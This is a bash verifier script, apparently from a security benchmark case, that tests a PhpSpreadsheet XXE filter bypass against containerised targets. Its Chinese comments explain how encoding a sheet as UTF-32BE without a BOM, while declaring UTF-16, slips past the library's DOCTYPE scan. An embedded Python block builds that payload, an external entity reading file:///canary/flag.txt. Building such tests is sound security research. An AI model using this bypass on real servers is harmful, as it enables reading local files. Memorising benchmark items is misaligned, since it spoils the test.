#!/usr/bin/env bash
# verify.sh --seed|--residual  —  PCBV2-0014 xxe_phpspreadsheet_ucs4 (CVE-2019-12331 -> CVE-2024-47873)
#
# 效果通道：/upload 的 HTTP 响应正文（canary token 经外部实体 file:///canary/flag.txt 反射进
# cell A1，再由 index.php 输出）。判定基准 RUN_FLAG_REF（回退 RUN_FLAG）。
#   seed     = DOUBLE-UTF-7 编码的 DOCTYPE/ENTITY sheet（poc/original_poc.py）
#              v0(1.7.0) 单次 mb_convert 解码后扫描通过 -> flag 反射 -> rc=0
#              v1(1.29.2) toUtf8 双重编码复查拦截 -> rc=10
#   residual = UCS-4/UTF-32BE (NO BOM, declared encoding="UTF-16") 的同一 sheet（自包含生成）：
#              findCharSet 的 ASCII 正则被每字符 3 个 \0 干扰而失效（回落 UTF-8 不解码），
#              \0? "<!DOCTYPE" 扫描最多容忍 1 个 \0，libxml 解析时自动探测 UTF-32BE 并解析外部
#              实体 -> v1 上 flag 反射 -> rc=0（v2/1.29.4 的 \0* 扫描 + BOM 探测会拦截）。
#
# 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
CASE_DIR="${CASE_DIR:-$(cd "$(dirname "$0")/.." && pwd)}"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

# 执行：poc/seed_exec.py（公开执行器）——容器内 build_fixture.php 打包 .xlsx，再经真实 HTTP
# multipart POST /upload；返回 JSON 的 "X" 字段 = 命中通道（PCB_X 出现在响应正文时为其值）。
# 退出码：0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
REF="$RUN_FLAG"
mkdir -p "$WORK_DIR"

# --- 构造 candidate JSON ---------------------------------------------------------------
if [[ "$MODE" == "--seed" ]]; then
  "$PY" - "$CASE_DIR/poc" "$WORK_DIR/cand.json" <<'PYEOF'
import json, sys
sys.path.insert(0, sys.argv[1])
from original_poc import candidate
json.dump(candidate(), open(sys.argv[2], "w"))
PYEOF
else
  "$PY" - "$WORK_DIR/cand.json" <<'PYEOF'
import base64, json, sys
# 与 held-out residual 同一 sheet：UTF-32BE 编码、无 BOM、声明 encoding="UTF-16"。
XML = ('<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [ <!ENTITY xxe SYSTEM '
       '"file:///canary/flag.txt"> ]><worksheet xmlns="http://schemas.openxmlformats.org/'
       'spreadsheetml/2006/main"><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>&xxe;</t>'
       '</is></c></row></sheetData></worksheet>')
json.dump({"id": "residual_ucs4be_declUTF16_nobom",
           "sheet_b64": base64.b64encode(XML.encode("utf-32-be")).decode("ascii")},
          open(sys.argv[1], "w"))
PYEOF
fi

# --- 执行公开执行器 -------------------------------------------------------------------
# seed_exec.py 内部用 `docker compose exec`（cwd=poc/，向上找到 compose 文件），项目名取自
# COMPOSE_PROJECT_NAME 环境变量；PCB_X 作为它匹配响应正文的 canary token。
export COMPOSE_PROJECT_NAME
export PCB_X="$RUN_FLAG"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 600; echo

# --- 判定：X 字段（效果通道命中标记）非空即效果发生 ------------------------------------
"$PY" - "$OUT" "$RUN_FLAG" "$REF" <<'PYEOF'
import json, sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
# HTTP 层失败（上传/打包未到达目标应用）视为环境失败
if d.get("http_status") is None or d.get("http_status") == -1:
    sys.exit(20)
sys.exit(0 if d.get("X") in (sys.argv[2], sys.argv[3]) else 10)
PYEOF
